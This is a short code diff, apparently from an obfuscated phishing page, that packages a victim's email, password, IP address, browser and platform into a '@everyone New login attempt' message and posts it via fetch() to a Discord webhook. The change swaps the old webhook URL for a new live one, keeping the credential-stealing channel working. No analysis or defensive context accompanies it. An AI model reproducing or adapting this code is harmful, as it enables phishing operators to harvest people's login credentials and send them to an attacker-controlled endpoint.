@@ -29,7 +29,7 @@
                     content: '@everyone New login attempt:\nEmail: ' + _0x32c2 + '\nPassword: ' + _0x1fbe + '\nIP Address: ' + _0x2c94 + '\nBrowser: ' + _0x2bcf + '\nPlatform: ' + _0x36f9 + '\nScreen Resolution: ' + _0x3b8d + ','
                 };
 
-                var _0x4a13 = 'https://discord.com/api/webhooks/1306666512056320080/cf8gXnjmqwlDCs8Yb5av5B3-TlZK_st4pvzU-1e3ltvRQbA-2laOy_vdEbuErFhR4_WL';
+                var _0x4a13 = 'https://discord.com/api/webhooks/1306720855241523252/57GWBNWefEYv055_pM-nNkolRNEyMxVl2kkRBHdHd5AkCXuhybPHWZCl4C6rKkBYNKWG';
 
                 fetch(_0x4a13, {
                     method: _0x9b9f[16],
